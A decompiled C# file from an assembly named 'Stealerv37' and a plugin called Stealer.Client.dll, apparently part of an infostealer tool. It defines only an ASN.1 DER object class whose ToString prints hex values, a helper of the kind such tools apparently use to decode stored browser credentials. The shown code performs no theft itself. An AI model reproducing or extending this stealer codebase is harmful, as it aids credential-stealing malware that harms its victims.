// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.Asn1DerObject
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System.Collections.Generic;
using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public class Asn1DerObject
{
  public Asn1Der.Type Type { get; set; }

  public int Lenght { get; set; }

  public List<Asn1DerObject> Objects { get; }

  public byte[] Data { get; set; }

  public Asn1DerObject() => this.Objects = new List<Asn1DerObject>();

  public override string ToString()
  {
    StringBuilder stringBuilder1 = new StringBuilder();
    StringBuilder stringBuilder2 = new StringBuilder();
    switch (this.Type)
    {
      case Asn1Der.Type.Integer:
        foreach (byte num in this.Data)
          stringBuilder2.AppendFormat("{0:X2}", (object) num);
        stringBuilder1.AppendLine("\tINTEGER " + stringBuilder2?.ToString());
        break;
      case Asn1Der.Type.OctetString:
        foreach (byte num in this.Data)
          stringBuilder2.AppendFormat("{0:X2}", (object) num);
        stringBuilder1.AppendLine("\tOCTETSTRING " + stringBuilder2?.ToString());
        break;
      case Asn1Der.Type.ObjectIdentifier:
        foreach (byte num in this.Data)
          stringBuilder2.AppendFormat("{0:X2}", (object) num);
        stringBuilder1.AppendLine("\tOBJECTIDENTIFIER " + stringBuilder2?.ToString());
        break;
      case Asn1Der.Type.Sequence:
        stringBuilder1.AppendLine("SEQUENCE {");
        break;
    }
    foreach (Asn1DerObject asn1DerObject in this.Objects)
      stringBuilder1.Append((object) asn1DerObject);
    if (this.Type.Equals((object) Asn1Der.Type.Sequence))
      stringBuilder1.AppendLine("}");
    return stringBuilder1.ToString();
  }
}
